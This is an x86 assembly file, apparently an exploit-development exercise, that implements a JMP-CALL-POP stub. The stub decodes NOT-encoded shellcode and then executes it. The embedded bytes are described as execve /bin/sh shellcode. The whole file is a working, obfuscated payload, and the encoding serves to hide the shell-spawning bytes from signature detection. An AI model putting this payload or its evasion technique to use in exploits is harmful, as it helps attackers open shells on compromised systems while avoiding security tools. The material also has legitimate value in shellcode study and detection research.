; Date: 02/03/2019
; NOT-Decoder.asm
; Author: Daniele Votta
; Description: This program decode shellcode with NOT technique.
; JMP | CALL | POP | Techniques

global _start

section .text

_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	not byte [esi]
	inc esi
	loop decode
	jmp short EncodedShellcode

call_decoder:
	call decoder

	; Execve /bin/sh (25 bytes)
	EncodedShellcode: db 0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
